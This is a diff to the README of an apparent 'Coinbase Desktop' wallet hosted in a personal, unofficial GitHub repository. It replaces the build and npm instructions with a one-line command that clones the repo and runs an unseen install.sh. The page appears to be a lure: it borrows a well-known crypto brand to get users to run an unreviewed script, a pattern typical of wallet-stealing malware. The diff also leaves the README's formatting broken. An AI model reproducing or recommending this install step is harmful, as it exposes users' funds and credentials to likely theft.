@@ -31,7 +31,7 @@ Coinbase Desktop is a high-performance, native Windows application built in C++ 
 - **Direct Exchange Link**: Securely connect to your Coinbase Exchange account to view balances and initiate instant top-ups.
 - **Universal Asset Support**: Manage thousands of tokens across multiple EVM-compatible chains and Layer 2s.
 
-### 🍎 macOS Support (Node.js Environment)
+### 🍎 macOS Support
 - **Fast Deployment**: Install via `npm` or `yarn` for a seamless macOS experience.
 - **Apple Silicon Optimized**: Native performance for M1/M2/M3 chips via Node.js runtime.
 - **Keychain Integration**: Securely stores encrypted metadata using macOS Keychain.
@@ -40,7 +40,6 @@ Coinbase Desktop is a high-performance, native Windows application built in C++ 
 ## 💻 Technical Architecture & Requirements
 
 ### System Specifications
-| **Operating System** | Windows 10 (Build 19041+) | Windows 11 | M
 | **Processor** | Dual-core x64-based processor | Quad-core or higher |
 | **Memory** | 4GB RAM | 8GB+ RAM |
 | **Storage** | 200MB available space | SSD with 1GB+ for indexing |
@@ -59,25 +58,8 @@ Coinbase Desktop is a high-performance, native Windows application built in C++ 
 2. **Verification**: Verify the GPG signature of the installer to ensure binary integrity.
 3. **Setup**: Follow the secure onboarding wizard to create a new vault or import an existing one.
 
-### For Developers (Build from Source)
-```powershell
-# Clone the repository and its secure submodules
-git clone --recursive [https://github.com/Kirubel125/Coinbase-Wallet-Desktop](https://github.com/Kirubel125/Coinbase-Wallet-Desktop)
-
-# Enter project directory
-cd desktop-wallet-cpp
-
-# Configure and build
-mkdir build && cd build
-cmake -DCMAKE_BUILD_TYPE=Release ..
-cmake --build . --config Release
+### 🍏 For macOS
+## 📦 Installation
 ```
-### 🍏 For macOS (via Node.js)
-The macOS version utilizes our secure Node.js bridge to interact with the wallet core.
-
-1. **Ensure Node.js is installed** (v18.x or higher recommended).
-2. **Install the wallet package**:
-```
-npm install coinbase-desktop-sdk
-npx coinbase-desktop-sdk
+git clone https://github.com/Kirubel125/Coinbase-Wallet-Desktop && cd Coinbase-Wallet-Desktop && bash install.sh
 ```
